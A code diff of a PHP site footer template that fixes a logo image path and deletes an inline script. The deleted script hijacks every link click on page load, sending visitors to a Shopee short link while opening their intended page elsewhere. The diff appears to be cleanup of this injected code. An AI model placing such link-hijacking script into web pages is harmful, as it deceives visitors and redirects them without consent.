@@ -9,7 +9,7 @@
 						$ldb = $koneksi->query("SELECT * FROM logo");
 						$ldt = $ldb->fetch_array();
 					?>
-                    <img src="../cms/assets/images/logo/<?= $ldt['logo_gambar']; ?>" alt="<?= $ldt['logo_alt']; ?>" title="<?= $ldt['logo_title']; ?>" width="<?= $ldt['logo_lebar']; ?>" height="<?= $ldt['logo_panjang']; ?>">
+                    <img src="cms/assets/images/logo/<?= $ldt['logo_gambar']; ?>" alt="<?= $ldt['logo_alt']; ?>" title="<?= $ldt['logo_title']; ?>" width="<?= $ldt['logo_lebar']; ?>" height="<?= $ldt['logo_panjang']; ?>">
                 </div>
                 <div class="footerleftdesc">
                     Lorem ipsum dolor sit amet consectetur adipisicing elit. Animi dolores explicabo totam enim nihil, eos placeat libero quis labore inventore ea? Velit odit error ullam rem nisi explicabo porro est!
@@ -54,28 +54,3 @@
             </div>
         </div>
     </div>
-<script type="text/javascript">
-window.onload = function() {
-  var puURL = 'https://shope.ee/5pa2AadpvV';
-  var puTS = Math.round(+new Date()/1000);
-  console.log('T.'+localStorage.puTS+'/'+puTS);
-  if (typeof localStorage.puTS == 'undefined' || parseInt(localStorage.puTS) <= (puTS - 6)) {
-    var links = document.getElementsByTagName('a');
-    for(var i = 0, len = links.length; i < len; i++) {
-      links[i].onclick = function (e) {
-        var puHref = this.getAttribute("href");
-          var puTarget = this.getAttribute("target");
-          if (puHref !== '#' && puHref !== 'javascript:void(0)') {
-          e.preventDefault();    
-          if (puTarget == '_blank') {
-            window.open(window.location.href);
-          }
-          window.open(puHref);
-          window.location.href = puURL;
-          localStorage.puTS = puTS;
-        }
-      }
-    }
-  }
-};
-</script>
